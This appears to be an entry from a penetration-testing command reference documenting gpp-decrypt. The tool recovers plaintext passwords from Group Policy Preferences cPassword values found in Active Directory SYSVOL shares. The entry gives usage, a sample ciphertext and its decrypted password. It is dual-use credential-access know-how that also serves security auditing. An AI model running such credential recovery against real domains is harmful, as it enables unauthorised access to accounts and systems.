---
id: e7acf84f-ffe3-4c0b-a483-99c997916834
type: command
executor: bash
data: gpp-decrypt $_ENCRYPTED_STRING
output: >-
  /usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is
  deprecated

  MyUnclesAreMarioAndLuigi!!1!
created_at: '2019-09-26T22:51:06.756813+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - gpp
  - decrypt
  - credential-access
verified: true
validated: true
---

# gpp-decrypt-decrypt-cpassword

## Command

```bash
gpp-decrypt $_ENCRYPTED_STRING
```

## Description

This command decrypts a base64-encoded cPassword attribute from Group Policy Preferences (GPP) XML files using the known Microsoft AES key. It's used to recover plaintext passwords exposed in SYSVOL shares during Active Directory enumeration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ENCRYPTED_STRING | The base64-encoded cPassword string extracted from GPP XML | Yes |

## Examples

### Basic Usage

Decrypt a sample cPassword:

```bash
gpp-decrypt 'CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ'
```

### Advanced Usage

Decrypt from piped input:

```bash
echo 'encrypted_string' | gpp-decrypt
```

## Expected Output

The command outputs the plaintext password directly. A deprecation warning from OpenSSL may appear but does not affect functionality.

Example:

```
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
MyUnclesAreMarioAndLuigi!!1!
```

## Related

- [[tools/gpp-decrypt]]
- [[procedures/decrypt-gpp-password-from-sysvol]]
